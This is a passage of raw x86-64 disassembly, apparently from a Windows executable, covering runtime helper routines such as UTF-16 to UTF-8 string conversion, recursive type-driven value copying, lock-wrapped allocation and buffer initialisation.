  406b66:	48 89 43 08          	mov    %rax,0x8(%rbx)
  406b6a:	0f 8f 85 00 00 00    	jg     0x406bf5
  406b70:	48 8b 0d e9 0a 01 00 	mov    0x10ae9(%rip),%rcx        # 0x417660
  406b77:	ba 30 00 00 00       	mov    $0x30,%edx
  406b7c:	e8 c1 e6 ff ff       	call   0x405242
  406b81:	48 8d 0d 98 f1 00 00 	lea    0xf198(%rip),%rcx        # 0x415d20
  406b88:	49 89 c7             	mov    %rax,%r15
  406b8b:	48 8b 05 be 0a 01 00 	mov    0x10abe(%rip),%rax        # 0x417650
  406b92:	49 8b 57 18          	mov    0x18(%r15),%rdx
  406b96:	49 89 07             	mov    %rax,(%r15)
  406b99:	48 8d 05 60 e0 00 00 	lea    0xe060(%rip),%rax        # 0x414c00
  406ba0:	49 89 47 10          	mov    %rax,0x10(%r15)
  406ba4:	48 89 54 24 48       	mov    %rdx,0x48(%rsp)
  406ba9:	e8 ec e5 ff ff       	call   0x40519a
  406bae:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
  406bb3:	49 89 47 18          	mov    %rax,0x18(%r15)
  406bb7:	48 85 d2             	test   %rdx,%rdx
  406bba:	74 08                	je     0x406bc4
  406bbc:	48 89 d1             	mov    %rdx,%rcx
  406bbf:	e8 3c 71 00 00       	call   0x40dd00
  406bc4:	49 8d 4f 08          	lea    0x8(%r15),%rcx
  406bc8:	31 d2                	xor    %edx,%edx
  406bca:	e8 8d d5 ff ff       	call   0x40415c
  406bcf:	4c 8d 0d 41 e0 00 00 	lea    0xe041(%rip),%r9        # 0x414c17
  406bd6:	4c 89 f9             	mov    %r15,%rcx
  406bd9:	48 c7 44 24 20 0b 01 	movq   $0x10b,0x20(%rsp)
  406be0:	00 00 
  406be2:	4c 8d 05 3a e0 00 00 	lea    0xe03a(%rip),%r8        # 0x414c23
  406be9:	48 8d 15 10 e0 00 00 	lea    0xe010(%rip),%rdx        # 0x414c00
  406bf0:	e8 c0 ef ff ff       	call   0x405bb5
  406bf5:	48 ff c5             	inc    %rbp
  406bf8:	48 83 c3 38          	add    $0x38,%rbx
  406bfc:	e9 61 fe ff ff       	jmp    0x406a62
  406c01:	48 83 c7 10          	add    $0x10,%rdi
  406c05:	48 83 ff 30          	cmp    $0x30,%rdi
  406c09:	0f 85 0e fe ff ff    	jne    0x406a1d
  406c0f:	31 d2                	xor    %edx,%edx
  406c11:	48 85 f6             	test   %rsi,%rsi
  406c14:	74 03                	je     0x406c19
  406c16:	48 8b 16             	mov    (%rsi),%rdx
  406c19:	48 8d 4e 10          	lea    0x10(%rsi),%rcx
  406c1d:	e8 97 12 00 00       	call   0x407eb9
  406c22:	90                   	nop
  406c23:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
  406c2a:	5b                   	pop    %rbx
  406c2b:	5e                   	pop    %rsi
  406c2c:	5f                   	pop    %rdi
  406c2d:	5d                   	pop    %rbp
  406c2e:	41 5c                	pop    %r12
  406c30:	41 5d                	pop    %r13
  406c32:	41 5e                	pop    %r14
  406c34:	41 5f                	pop    %r15
  406c36:	c3                   	ret
  406c37:	90                   	nop
  406c38:	90                   	nop
  406c39:	90                   	nop
  406c3a:	90                   	nop
  406c3b:	90                   	nop
  406c3c:	90                   	nop
  406c3d:	90                   	nop
  406c3e:	90                   	nop
  406c3f:	90                   	nop
  406c40:	55                   	push   %rbp
  406c41:	57                   	push   %rdi
  406c42:	56                   	push   %rsi
  406c43:	53                   	push   %rbx
  406c44:	48 83 ec 28          	sub    $0x28,%rsp
  406c48:	48 89 cd             	mov    %rcx,%rbp
  406c4b:	48 89 d1             	mov    %rdx,%rcx
  406c4e:	48 c1 f9 02          	sar    $0x2,%rcx
  406c52:	48 01 d1             	add    %rdx,%rcx
  406c55:	e8 26 e6 ff ff       	call   0x405280
  406c5a:	31 c9                	xor    %ecx,%ecx
  406c5c:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
  406c60:	66 8b 74 15 00       	mov    0x0(%rbp,%rdx,1),%si
  406c65:	66 85 f6             	test   %si,%si
  406c68:	0f 84 44 01 00 00    	je     0x406db2
  406c6e:	48 8d 79 01          	lea    0x1(%rcx),%rdi
  406c72:	66 81 fe ff d7       	cmp    $0xd7ff,%si
  406c77:	0f b7 de             	movzwl %si,%ebx
  406c7a:	77 0d                	ja     0x406c89
  406c7c:	48 81 fb ff d7 00 00 	cmp    $0xd7ff,%rbx
  406c83:	41 0f 9f c0          	setg   %r8b
  406c87:	eb 0b                	jmp    0x406c94
  406c89:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  406c90:	41 0f 9e c0          	setle  %r8b
  406c94:	45 84 c0             	test   %r8b,%r8b
  406c97:	74 4e                	je     0x406ce7
  406c99:	44 0f b7 44 15 02    	movzwl 0x2(%rbp,%rdx,1),%r8d
  406c9f:	66 41 81 f8 ff db    	cmp    $0xdbff,%r8w
  406ca5:	4c 89 c2             	mov    %r8,%rdx
  406ca8:	77 0d                	ja     0x406cb7
  406caa:	49 81 f8 ff db 00 00 	cmp    $0xdbff,%r8
  406cb1:	41 0f 9f c0          	setg   %r8b
  406cb5:	eb 0b                	jmp    0x406cc2
  406cb7:	49 81 f8 ff df 00 00 	cmp    $0xdfff,%r8
  406cbe:	41 0f 9e c0          	setle  %r8b
  406cc2:	45 84 c0             	test   %r8b,%r8b
  406cc5:	74 7c                	je     0x406d43
  406cc7:	48 8d 79 02          	lea    0x2(%rcx),%rdi
  406ccb:	48 c1 e3 0a          	shl    $0xa,%rbx
  406ccf:	81 e2 ff 03 00 00    	and    $0x3ff,%edx
  406cd5:	81 e3 00 fc 0f 00    	and    $0xffc00,%ebx
  406cdb:	48 09 d3             	or     %rdx,%rbx
  406cde:	48 81 c3 00 00 01 00 	add    $0x10000,%rbx
  406ce5:	eb 51                	jmp    0x406d38
  406ce7:	66 81 fe ff db       	cmp    $0xdbff,%si
  406cec:	77 0c                	ja     0x406cfa
  406cee:	48 81 fb ff db 00 00 	cmp    $0xdbff,%rbx
  406cf5:	0f 9f c2             	setg   %dl
  406cf8:	eb 0a                	jmp    0x406d04
  406cfa:	48 81 fb ff df 00 00 	cmp    $0xdfff,%rbx
  406d01:	0f 9e c2             	setle  %dl
  406d04:	84 d2                	test   %dl,%dl
  406d06:	75 3b                	jne    0x406d43
  406d08:	66 83 fe 7f          	cmp    $0x7f,%si
  406d0c:	0f b7 d6             	movzwl %si,%edx
  406d0f:	76 6d                	jbe    0x406d7e
  406d11:	48 81 fb ff 07 00 00 	cmp    $0x7ff,%rbx
  406d18:	7f 1e                	jg     0x406d38
  406d1a:	48 c1 fb 06          	sar    $0x6,%rbx
  406d1e:	83 e6 3f             	and    $0x3f,%esi
  406d21:	48 89 c1             	mov    %rax,%rcx
  406d24:	83 cb c0             	or     $0xffffffc0,%ebx
  406d27:	83 ce 80             	or     $0xffffff80,%esi
  406d2a:	0f be d3             	movsbl %bl,%edx
  406d2d:	e8 60 e3 ff ff       	call   0x405092
  406d32:	40 0f be d6          	movsbl %sil,%edx
  406d36:	eb 46                	jmp    0x406d7e
  406d38:	48 81 fb ff ff 00 00 	cmp    $0xffff,%rbx
  406d3f:	7f 4d                	jg     0x406d8e
  406d41:	eb 05                	jmp    0x406d48
  406d43:	bb fd ff 00 00       	mov    $0xfffd,%ebx
  406d48:	48 89 da             	mov    %rbx,%rdx
  406d4b:	48 c1 fa 0c          	sar    $0xc,%rdx
  406d4f:	83 ca e0             	or     $0xffffffe0,%edx
  406d52:	0f be d2             	movsbl %dl,%edx
  406d55:	48 89 c1             	mov    %rax,%rcx
  406d58:	e8 35 e3 ff ff       	call   0x405092
  406d5d:	48 89 da             	mov    %rbx,%rdx
  406d60:	83 e3 3f             	and    $0x3f,%ebx
  406d63:	48 c1 fa 06          	sar    $0x6,%rdx
  406d67:	48 89 c1             	mov    %rax,%rcx
  406d6a:	83 cb 80             	or     $0xffffff80,%ebx
  406d6d:	83 e2 3f             	and    $0x3f,%edx
  406d70:	83 ca 80             	or     $0xffffff80,%edx
  406d73:	0f be d2             	movsbl %dl,%edx
  406d76:	e8 17 e3 ff ff       	call   0x405092
  406d7b:	0f be d3             	movsbl %bl,%edx
  406d7e:	48 89 c1             	mov    %rax,%rcx
  406d81:	e8 0c e3 ff ff       	call   0x405092
  406d86:	48 89 f9             	mov    %rdi,%rcx
  406d89:	e9 ce fe ff ff       	jmp    0x406c5c
  406d8e:	48 89 da             	mov    %rbx,%rdx
  406d91:	48 89 c1             	mov    %rax,%rcx
  406d94:	48 c1 fa 12          	sar    $0x12,%rdx
  406d98:	83 ca f0             	or     $0xfffffff0,%edx
  406d9b:	0f be d2             	movsbl %dl,%edx
  406d9e:	e8 ef e2 ff ff       	call   0x405092
  406da3:	48 89 da             	mov    %rbx,%rdx
  406da6:	48 c1 fa 0c          	sar    $0xc,%rdx
  406daa:	83 e2 3f             	and    $0x3f,%edx
  406dad:	83 ca 80             	or     $0xffffff80,%edx
  406db0:	eb a0                	jmp    0x406d52
  406db2:	48 83 c4 28          	add    $0x28,%rsp
  406db6:	5b                   	pop    %rbx
  406db7:	5e                   	pop    %rsi
  406db8:	5f                   	pop    %rdi
  406db9:	5d                   	pop    %rbp
  406dba:	c3                   	ret
  406dbb:	56                   	push   %rsi
  406dbc:	53                   	push   %rbx
  406dbd:	48 83 ec 28          	sub    $0x28,%rsp
  406dc1:	48 89 cb             	mov    %rcx,%rbx
  406dc4:	48 8d 0d 75 6f 02 00 	lea    0x26f75(%rip),%rcx        # 0x42dd40
  406dcb:	ff 15 43 45 03 00    	call   *0x34543(%rip)        # 0x43b314
  406dd1:	48 8b 33             	mov    (%rbx),%rsi
  406dd4:	48 8b 1d 61 46 03 00 	mov    0x34661(%rip),%rbx        # 0x43b43c
  406ddb:	ff d3                	call   *%rbx
  406ddd:	45 31 c0             	xor    %r8d,%r8d
  406de0:	48 8d 48 30          	lea    0x30(%rax),%rcx
  406de4:	48 89 f2             	mov    %rsi,%rdx
  406de7:	e8 58 b6 ff ff       	call   0x402444
  406dec:	ff d3                	call   *%rbx
  406dee:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  406df4:	ba 01 00 00 00       	mov    $0x1,%edx
  406df9:	4c 8d 48 30          	lea    0x30(%rax),%r9
  406dfd:	48 8d 0d dc f9 00 00 	lea    0xf9dc(%rip),%rcx        # 0x4167e0
  406e04:	e8 af 47 00 00       	call   0x40b5b8
  406e09:	ff d3                	call   *%rbx
  406e0b:	48 8d 48 30          	lea    0x30(%rax),%rcx
  406e0f:	e8 dc 47 00 00       	call   0x40b5f0
  406e14:	48 8d 0d 25 6f 02 00 	lea    0x26f25(%rip),%rcx        # 0x42dd40
  406e1b:	48 83 c4 28          	add    $0x28,%rsp
  406e1f:	5b                   	pop    %rbx
  406e20:	5e                   	pop    %rsi
  406e21:	48 ff 25 44 45 03 00 	rex.W jmp *0x34544(%rip)        # 0x43b36c
  406e28:	53                   	push   %rbx
  406e29:	48 83 ec 20          	sub    $0x20,%rsp
  406e2d:	48 8d 0d cc 6e 02 00 	lea    0x26ecc(%rip),%rcx        # 0x42dd00
  406e34:	ff 15 da 44 03 00    	call   *0x344da(%rip)        # 0x43b314
  406e3a:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  406e3f:	48 8d 0d ba 3b 02 00 	lea    0x23bba(%rip),%rcx        # 0x42aa00
  406e46:	e8 c6 b1 ff ff       	call   0x402011
  406e4b:	48 8d 0d ae 6e 02 00 	lea    0x26eae(%rip),%rcx        # 0x42dd00
  406e52:	48 89 c3             	mov    %rax,%rbx
  406e55:	ff 15 11 45 03 00    	call   *0x34511(%rip)        # 0x43b36c
  406e5b:	ba 88 3e 00 00       	mov    $0x3e88,%edx
  406e60:	48 89 d9             	mov    %rbx,%rcx
  406e63:	e8 e4 d2 ff ff       	call   0x40414c
  406e68:	48 89 d8             	mov    %rbx,%rax
  406e6b:	48 83 c4 20          	add    $0x20,%rsp
  406e6f:	5b                   	pop    %rbx
  406e70:	c3                   	ret
  406e71:	53                   	push   %rbx
  406e72:	48 83 ec 20          	sub    $0x20,%rsp
  406e76:	48 89 cb             	mov    %rcx,%rbx
  406e79:	48 8d 0d 30 08 02 00 	lea    0x20830(%rip),%rcx        # 0x4276b0
  406e80:	ff 15 e6 44 03 00    	call   *0x344e6(%rip)        # 0x43b36c
  406e86:	48 8b 0b             	mov    (%rbx),%rcx
  406e89:	83 ca ff             	or     $0xffffffff,%edx
  406e8c:	ff 15 4e 3b 02 00    	call   *0x23b4e(%rip)        # 0x42a9e0
  406e92:	48 8d 0d 17 08 02 00 	lea    0x20817(%rip),%rcx        # 0x4276b0
  406e99:	48 83 c4 20          	add    $0x20,%rsp
  406e9d:	5b                   	pop    %rbx
  406e9e:	48 ff 25 6f 44 03 00 	rex.W jmp *0x3446f(%rip)        # 0x43b314
  406ea5:	41 57                	push   %r15
  406ea7:	41 56                	push   %r14
  406ea9:	41 55                	push   %r13
  406eab:	41 54                	push   %r12
  406ead:	55                   	push   %rbp
  406eae:	57                   	push   %rdi
  406eaf:	56                   	push   %rsi
  406eb0:	53                   	push   %rbx
  406eb1:	48 83 ec 28          	sub    $0x28,%rsp
  406eb5:	41 8a 40 08          	mov    0x8(%r8),%al
  406eb9:	3c 12                	cmp    $0x12,%al
  406ebb:	48 89 cb             	mov    %rcx,%rbx
  406ebe:	48 89 d6             	mov    %rdx,%rsi
  406ec1:	4c 89 c5             	mov    %r8,%rbp
  406ec4:	44 89 cf             	mov    %r9d,%edi
  406ec7:	45 0f b6 e1          	movzbl %r9b,%r12d
  406ecb:	0f 84 4d 01 00 00    	je     0x40701e
  406ed1:	77 1b                	ja     0x406eee
  406ed3:	3c 10                	cmp    $0x10,%al
  406ed5:	0f 84 66 01 00 00    	je     0x407041
  406edb:	0f 87 1b 01 00 00    	ja     0x406ffc
  406ee1:	3c 04                	cmp    $0x4,%al
  406ee3:	0f 84 58 01 00 00    	je     0x407041
  406ee9:	e9 53 02 00 00       	jmp    0x407141
  406eee:	3c 18                	cmp    $0x18,%al
  406ef0:	74 72                	je     0x406f64
  406ef2:	3c 1c                	cmp    $0x1c,%al
  406ef4:	74 0d                	je     0x406f03
  406ef6:	3c 16                	cmp    $0x16,%al
  406ef8:	0f 85 43 02 00 00    	jne    0x407141
  406efe:	e9 79 01 00 00       	jmp    0x40707c
  406f03:	45 84 c9             	test   %r9b,%r9b
  406f06:	48 8b 32             	mov    (%rdx),%rsi
  406f09:	75 38                	jne    0x406f43
  406f0b:	48 85 f6             	test   %rsi,%rsi
  406f0e:	75 0c                	jne    0x406f1c
  406f10:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  406f17:	e9 2e 02 00 00       	jmp    0x40714a
  406f1c:	48 8b 06             	mov    (%rsi),%rax
  406f1f:	48 8d 0d ca 07 02 00 	lea    0x207ca(%rip),%rcx        # 0x4276f0
  406f26:	48 8d 50 11          	lea    0x11(%rax),%rdx
  406f2a:	e8 e2 b0 ff ff       	call   0x402011
  406f2f:	48 8b 3e             	mov    (%rsi),%rdi
  406f32:	48 8d 4f 11          	lea    0x11(%rdi),%rcx
  406f36:	48 89 c7             	mov    %rax,%rdi
  406f39:	f3 a4                	rep movsb (%rsi),(%rdi)
  406f3b:	48 89 03             	mov    %rax,(%rbx)
  406f3e:	e9 07 02 00 00       	jmp    0x40714a
  406f43:	48 85 f6             	test   %rsi,%rsi
  406f46:	0f 84 41 01 00 00    	je     0x40708d
  406f4c:	48 89 f1             	mov    %rsi,%rcx
  406f4f:	e8 5b 17 00 00       	call   0x4086af
  406f54:	48 89 d9             	mov    %rbx,%rcx
  406f57:	48 89 c2             	mov    %rax,%rdx
  406f5a:	e8 1a e4 ff ff       	call   0x405379
  406f5f:	e9 bd 01 00 00       	jmp    0x407121
  406f64:	48 8b 32             	mov    (%rdx),%rsi
  406f67:	48 85 f6             	test   %rsi,%rsi
  406f6a:	0f 84 14 01 00 00    	je     0x407084
  406f70:	45 84 c9             	test   %r9b,%r9b
  406f73:	75 20                	jne    0x406f95
  406f75:	49 8b 40 10          	mov    0x10(%r8),%rax
  406f79:	48 8d 0d 70 07 02 00 	lea    0x20770(%rip),%rcx        # 0x4276f0
  406f80:	48 8b 10             	mov    (%rax),%rdx
  406f83:	48 0f af 16          	imul   (%rsi),%rdx
  406f87:	48 83 c2 10          	add    $0x10,%rdx
  406f8b:	e8 9f b0 ff ff       	call   0x40202f
  406f90:	48 89 03             	mov    %rax,(%rbx)
  406f93:	eb 16                	jmp    0x406fab
  406f95:	48 8b 16             	mov    (%rsi),%rdx
  406f98:	4c 89 c1             	mov    %r8,%rcx
  406f9b:	e8 56 ee ff ff       	call   0x405df6
  406fa0:	48 89 d9             	mov    %rbx,%rcx
  406fa3:	48 89 c2             	mov    %rax,%rdx
  406fa6:	e8 ce e3 ff ff       	call   0x405379
  406fab:	48 8b 1b             	mov    (%rbx),%rbx
  406fae:	4c 8d 7e 10          	lea    0x10(%rsi),%r15
  406fb2:	45 31 ed             	xor    %r13d,%r13d
  406fb5:	48 8b 06             	mov    (%rsi),%rax
  406fb8:	48 83 c3 10          	add    $0x10,%rbx
  406fbc:	48 89 43 f0          	mov    %rax,-0x10(%rbx)
  406fc0:	4c 8b 36             	mov    (%rsi),%r14
  406fc3:	4c 89 73 f8          	mov    %r14,-0x8(%rbx)
  406fc7:	49 ff ce             	dec    %r14
  406fca:	4d 39 ee             	cmp    %r13,%r14
  406fcd:	7c 1f                	jl     0x406fee
  406fcf:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  406fd3:	4c 89 e9             	mov    %r13,%rcx
  406fd6:	45 89 e1             	mov    %r12d,%r9d
  406fd9:	49 ff c5             	inc    %r13
  406fdc:	49 0f af 08          	imul   (%r8),%rcx
  406fe0:	49 8d 14 0f          	lea    (%r15,%rcx,1),%rdx
  406fe4:	48 01 d9             	add    %rbx,%rcx
  406fe7:	e8 b9 fe ff ff       	call   0x406ea5
  406fec:	eb dc                	jmp    0x406fca
  406fee:	40 84 ff             	test   %dil,%dil
  406ff1:	0f 84 53 01 00 00    	je     0x40714a
  406ff7:	e9 25 01 00 00       	jmp    0x407121
  406ffc:	4d 8b 40 10          	mov    0x10(%r8),%r8
  407000:	41 0f b6 f9          	movzbl %r9b,%edi
  407004:	4d 85 c0             	test   %r8,%r8
  407007:	74 0a                	je     0x407013
  407009:	41 89 f9             	mov    %edi,%r9d
  40700c:	e8 94 fe ff ff       	call   0x406ea5
  407011:	eb 06                	jmp    0x407019
  407013:	48 8b 02             	mov    (%rdx),%rax
  407016:	48 89 01             	mov    %rax,(%rcx)
  407019:	41 89 f9             	mov    %edi,%r9d
  40701c:	eb 04                	jmp    0x407022
  40701e:	45 0f b6 c9          	movzbl %r9b,%r9d
  407022:	4c 8b 45 18          	mov    0x18(%rbp),%r8
  407026:	48 89 f2             	mov    %rsi,%rdx
  407029:	48 89 d9             	mov    %rbx,%rcx
  40702c:	48 83 c4 28          	add    $0x28,%rsp
  407030:	5b                   	pop    %rbx
  407031:	5e                   	pop    %rsi
  407032:	5f                   	pop    %rdi
  407033:	5d                   	pop    %rbp
  407034:	41 5c                	pop    %r12
  407036:	41 5d                	pop    %r13
  407038:	41 5e                	pop    %r14
  40703a:	41 5f                	pop    %r15
  40703c:	e9 1a 01 00 00       	jmp    0x40715b
  407041:	48 8b 45 00          	mov    0x0(%rbp),%rax
  407045:	48 8b 7d 10          	mov    0x10(%rbp),%rdi
  407049:	48 99                	cqto
  40704b:	48 f7 3f             	idivq  (%rdi)
  40704e:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  407052:	31 ff                	xor    %edi,%edi
  407054:	49 39 fd             	cmp    %rdi,%r13
  407057:	0f 8c ed 00 00 00    	jl     0x40714a
  40705d:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  407061:	48 89 f9             	mov    %rdi,%rcx
  407064:	45 89 e1             	mov    %r12d,%r9d
  407067:	48 ff c7             	inc    %rdi
  40706a:	49 0f af 08          	imul   (%r8),%rcx
  40706e:	48 8d 14 0e          	lea    (%rsi,%rcx,1),%rdx
  407072:	48 01 d9             	add    %rbx,%rcx
  407075:	e8 2b fe ff ff       	call   0x406ea5
  40707a:	eb d8                	jmp    0x407054
  40707c:	48 8b 32             	mov    (%rdx),%rsi
  40707f:	48 85 f6             	test   %rsi,%rsi
  407082:	75 23                	jne    0x4070a7
  407084:	40 84 ff             	test   %dil,%dil
  407087:	0f 84 83 fe ff ff    	je     0x406f10
  40708d:	31 d2                	xor    %edx,%edx
  40708f:	48 89 d9             	mov    %rbx,%rcx
  407092:	48 83 c4 28          	add    $0x28,%rsp
  407096:	5b                   	pop    %rbx
  407097:	5e                   	pop    %rsi
  407098:	5f                   	pop    %rdi
  407099:	5d                   	pop    %rbp
  40709a:	41 5c                	pop    %r12
  40709c:	41 5d                	pop    %r13
  40709e:	41 5e                	pop    %r14
  4070a0:	41 5f                	pop    %r15
  4070a2:	e9 d2 e2 ff ff       	jmp    0x405379
  4070a7:	45 84 c9             	test   %r9b,%r9b
  4070aa:	75 44                	jne    0x4070f0
  4070ac:	48 8b 7e f8          	mov    -0x8(%rsi),%rdi
  4070b0:	48 8d 0d 39 06 02 00 	lea    0x20639(%rip),%rcx        # 0x4276f0
  4070b7:	48 8b 47 10          	mov    0x10(%rdi),%rax
  4070bb:	48 8b 10             	mov    (%rax),%rdx
  4070be:	48 83 c2 08          	add    $0x8,%rdx
  4070c2:	e8 68 af ff ff       	call   0x40202f
  4070c7:	45 31 c9             	xor    %r9d,%r9d
  4070ca:	48 89 f2             	mov    %rsi,%rdx
  4070cd:	48 89 03             	mov    %rax,(%rbx)
  4070d0:	48 8d 48 08          	lea    0x8(%rax),%rcx
  4070d4:	48 89 38             	mov    %rdi,(%rax)
  4070d7:	4c 8b 47 10          	mov    0x10(%rdi),%r8
  4070db:	48 83 c4 28          	add    $0x28,%rsp
  4070df:	5b                   	pop    %rbx
  4070e0:	5e                   	pop    %rsi
  4070e1:	5f                   	pop    %rdi
  4070e2:	5d                   	pop    %rbp
  4070e3:	41 5c                	pop    %r12
  4070e5:	41 5d                	pop    %r13
  4070e7:	41 5e                	pop    %r14
  4070e9:	41 5f                	pop    %r15
  4070eb:	e9 b5 fd ff ff       	jmp    0x406ea5
  4070f0:	48 8b 2e             	mov    (%rsi),%rbp
  4070f3:	48 8b 45 10          	mov    0x10(%rbp),%rax
  4070f7:	48 89 e9             	mov    %rbp,%rcx
  4070fa:	48 8b 10             	mov    (%rax),%rdx
  4070fd:	e8 40 e1 ff ff       	call   0x405242
  407102:	48 89 d9             	mov    %rbx,%rcx
  407105:	48 89 c2             	mov    %rax,%rdx
  407108:	e8 6c e2 ff ff       	call   0x405379
  40710d:	48 8b 0b             	mov    (%rbx),%rcx
  407110:	48 8d 56 08          	lea    0x8(%rsi),%rdx
  407114:	44 0f b6 cf          	movzbl %dil,%r9d
  407118:	4c 8b 45 10          	mov    0x10(%rbp),%r8
  40711c:	e8 84 fd ff ff       	call   0x406ea5
  407121:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
  407125:	48 8d 0d c4 05 02 00 	lea    0x205c4(%rip),%rcx        # 0x4276f0
  40712c:	48 83 c4 28          	add    $0x28,%rsp
  407130:	5b                   	pop    %rbx
  407131:	5e                   	pop    %rsi
  407132:	5f                   	pop    %rdi
  407133:	5d                   	pop    %rbp
  407134:	41 5c                	pop    %r12
  407136:	41 5d                	pop    %r13
  407138:	41 5e                	pop    %r14
  40713a:	41 5f                	pop    %r15
  40713c:	e9 f1 c5 ff ff       	jmp    0x403732
  407141:	48 8b 4d 00          	mov    0x0(%rbp),%rcx
  407145:	48 89 df             	mov    %rbx,%rdi
  407148:	f3 a4                	rep movsb (%rsi),(%rdi)
  40714a:	48 83 c4 28          	add    $0x28,%rsp
  40714e:	5b                   	pop    %rbx
  40714f:	5e                   	pop    %rsi
  407150:	5f                   	pop    %rdi
  407151:	5d                   	pop    %rbp
  407152:	41 5c                	pop    %r12
  407154:	41 5d                	pop    %r13
  407156:	41 5e                	pop    %r14
  407158:	41 5f                	pop    %r15
  40715a:	c3                   	ret
  40715b:	41 55                	push   %r13
  40715d:	41 54                	push   %r12
  40715f:	55                   	push   %rbp
  407160:	57                   	push   %rdi
  407161:	56                   	push   %rsi
  407162:	53                   	push   %rbx
  407163:	48 83 ec 38          	sub    $0x38,%rsp
  407167:	41 8a 00             	mov    (%r8),%al
  40716a:	3c 02                	cmp    $0x2,%al
  40716c:	49 89 cc             	mov    %rcx,%r12
  40716f:	48 89 d5             	mov    %rdx,%rbp
  407172:	4c 89 c3             	mov    %r8,%rbx
  407175:	41 0f b6 f9          	movzbl %r9b,%edi
  407179:	74 30                	je     0x4071ab
  40717b:	3c 03                	cmp    $0x3,%al
  40717d:	74 56                	je     0x4071d5
  40717f:	fe c8                	dec    %al
  407181:	0f 85 9d 00 00 00    	jne    0x407224
  407187:	49 8b 48 08          	mov    0x8(%r8),%rcx
  40718b:	45 0f b6 c9          	movzbl %r9b,%r9d
  40718f:	4d 8b 40 10          	mov    0x10(%r8),%r8
  407193:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
  407197:	4c 01 e1             	add    %r12,%rcx
  40719a:	48 83 c4 38          	add    $0x38,%rsp
  40719e:	5b                   	pop    %rbx
  40719f:	5e                   	pop    %rsi
  4071a0:	5f                   	pop    %rdi
  4071a1:	5d                   	pop    %rbp
  4071a2:	41 5c                	pop    %r12
  4071a4:	41 5d                	pop    %r13
  4071a6:	e9 fa fc ff ff       	jmp    0x406ea5
  4071ab:	49 8b 40 20          	mov    0x20(%r8),%rax
  4071af:	31 f6                	xor    %esi,%esi
  4071b1:	4c 8d 68 ff          	lea    -0x1(%rax),%r13
  4071b5:	49 39 f5             	cmp    %rsi,%r13
  4071b8:	7c 6a                	jl     0x407224
  4071ba:	48 8b 43 28          	mov    0x28(%rbx),%rax
  4071be:	41 89 f9             	mov    %edi,%r9d
  4071c1:	48 89 ea             	mov    %rbp,%rdx
  4071c4:	4c 89 e1             	mov    %r12,%rcx
  4071c7:	4c 8b 04 f0          	mov    (%rax,%rsi,8),%r8
  4071cb:	48 ff c6             	inc    %rsi
  4071ce:	e8 88 ff ff ff       	call   0x40715b
  4071d3:	eb e0                	jmp    0x4071b5
  4071d5:	49 8b 70 08          	mov    0x8(%r8),%rsi
  4071d9:	44 89 4c 24 2c       	mov    %r9d,0x2c(%rsp)
  4071de:	49 8b 50 10          	mov    0x10(%r8),%rdx
  4071e2:	48 8d 04 31          	lea    (%rcx,%rsi,1),%rax
  4071e6:	48 01 ee             	add    %rbp,%rsi
  4071e9:	48 8b 0a             	mov    (%rdx),%rcx
  4071ec:	48 89 c7             	mov    %rax,%rdi
  4071ef:	4c 89 c2             	mov    %r8,%rdx
  4071f2:	f3 a4                	rep movsb (%rsi),(%rdi)
  4071f4:	48 89 e9             	mov    %rbp,%rcx
  4071f7:	e8 d2 c4 ff ff       	call   0x4036ce
  4071fc:	48 85 c0             	test   %rax,%rax
  4071ff:	49 89 c0             	mov    %rax,%r8
  407202:	74 20                	je     0x407224
  407204:	44 8b 4c 24 2c       	mov    0x2c(%rsp),%r9d
  407209:	48 89 ea             	mov    %rbp,%rdx
  40720c:	4c 89 e1             	mov    %r12,%rcx
  40720f:	45 0f b6 c9          	movzbl %r9b,%r9d
  407213:	48 83 c4 38          	add    $0x38,%rsp
  407217:	5b                   	pop    %rbx
  407218:	5e                   	pop    %rsi
  407219:	5f                   	pop    %rdi
  40721a:	5d                   	pop    %rbp
  40721b:	41 5c                	pop    %r12
  40721d:	41 5d                	pop    %r13
  40721f:	e9 37 ff ff ff       	jmp    0x40715b
  407224:	48 83 c4 38          	add    $0x38,%rsp
  407228:	5b                   	pop    %rbx
  407229:	5e                   	pop    %rsi
  40722a:	5f                   	pop    %rdi
  40722b:	5d                   	pop    %rbp
  40722c:	41 5c                	pop    %r12
  40722e:	41 5d                	pop    %r13
  407230:	c3                   	ret
  407231:	53                   	push   %rbx
  407232:	48 83 ec 40          	sub    $0x40,%rsp
  407236:	b9 10 00 00 00       	mov    $0x10,%ecx
  40723b:	e8 73 e0 ff ff       	call   0x4052b3
  407240:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
  407245:	ba 10 00 00 00       	mov    $0x10,%edx
  40724a:	48 89 d9             	mov    %rbx,%rcx
  40724d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
  407252:	e8 f5 ce ff ff       	call   0x40414c
  407257:	ba 10 00 00 00       	mov    $0x10,%edx
  40725c:	48 89 d9             	mov    %rbx,%rcx
  40725f:	e8 e8 ce ff ff       	call   0x40414c
  407264:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
  407269:	31 d2                	xor    %edx,%edx
  40726b:	4c 8d 05 5e f6 00 00 	lea    0xf65e(%rip),%r8        # 0x4168d0
  407272:	41 8a 0c 10          	mov    (%r8,%rdx,1),%cl
  407276:	88 4c 10 10          	mov    %cl,0x10(%rax,%rdx,1)
  40727a:	48 ff c2             	inc    %rdx
  40727d:	48 83 fa 0f          	cmp    $0xf,%rdx
  407281:	75 ef                	jne    0x407272
  407283:	48 83 c4 40          	add    $0x40,%rsp
  407287:	5b                   	pop    %rbx
  407288:	c3                   	ret
  407289:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
  40728e:	41 83 e1 03          	and    $0x3,%r9d
  407292:	4c 33 4c 24 28       	xor    0x28(%rsp),%r9
  407297:	31 d1                	xor    %edx,%ecx
  407299:	46 8b 14 88          	mov    (%rax,%r9,4),%r10d
  40729d:	44 8d 0c 95 00 00 00 	lea    0x0(,%rdx,4),%r9d
  4072a4:	00 
